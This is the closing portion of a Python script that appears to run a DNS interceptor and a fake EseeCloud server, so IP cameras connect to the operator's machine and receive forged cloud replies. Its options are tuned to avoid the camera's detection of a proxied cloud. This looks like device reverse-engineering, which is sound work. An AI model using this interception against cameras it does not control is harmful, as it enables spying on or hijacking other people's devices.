    print(f"  Fake ports:    {args.ports}")
    print(f"  Log directory: {args.log_dir}")
    print("=" * 60)
    print()

    await dns.start()
    print()
    await fake_server.start()
    print()

    print("  All services running. Press Ctrl+C to stop.")
    print("  Waiting for camera connections...")
    print()

    try:
        # Run forever
        while True:
            await asyncio.sleep(3600)
    except asyncio.CancelledError:
        pass
    finally:
        dns.stop()
        fake_server.stop()
        print("\n  Services stopped.")


def main():
    parser = argparse.ArgumentParser(
        description="EseeCloud DNS interceptor + fake server"
    )
    parser.add_argument("--our-ip", required=True,
                        help="Our machine's IP (returned for EseeCloud DNS queries)")
    parser.add_argument("--dns-port", type=int, default=5353,
                        help="Port for DNS interceptor (default 5353)")
    parser.add_argument("--upstream", default="8.8.8.8",
                        help="Upstream DNS for non-EseeCloud queries (default 8.8.8.8)")
    parser.add_argument("--ports", type=int, nargs="+",
                        default=DEFAULT_ESEECLOUD_PORTS,
                        help="TCP ports for fake EseeCloud server")
    parser.add_argument("--ack-byte", default="",
                        help="Hex byte to send as ACK after each chunk "
                             "(e.g. '01'). Default: empty (no injection). "
                             "Use only if camera disconnects without a response.")
    parser.add_argument("--message-reply-mode", type=int, default=-1,
                        help="Pin a /message/message success-candidate index "
                             "(0-12; default -1 = rotate through candidates)")
    parser.add_argument("--p2p-ip", default="129.153.101.14",
                        help="Public P2P IP returned by the forged "
                             "/address/device reply so the camera uses its "
                             "RAW-WS FULL 0x11 check-in behavior (default "
                             "129.153.101.14, an observed real P2P IP; the "
                             "capture script must redirect this IP to us)")
    parser.add_argument("--stun-ip", default="14.17.121.21",
                        help="Public STUN IP returned in the forged reply's "
                             "stun.ipv4 (default 14.17.121.21, the real "
                             "server's constant value observed in captures "
                             "20260808T053714Z/050802Z). MUST differ from "
                             "--p2p-ip: the camera treats stun == relay as "
                             "a fake/proxied cloud and downgrades to the "
                             "never-adopted HTTP-upgrade LITE check-in.")
    parser.add_argument("--log-dir", required=True,
                        help="Directory for log output")

    args = parser.parse_args()

    try:
        asyncio.run(main_async(args))
    except KeyboardInterrupt:
        print("\n  Interrupted. Shutting down...")


if __name__ == "__main__":
    main()
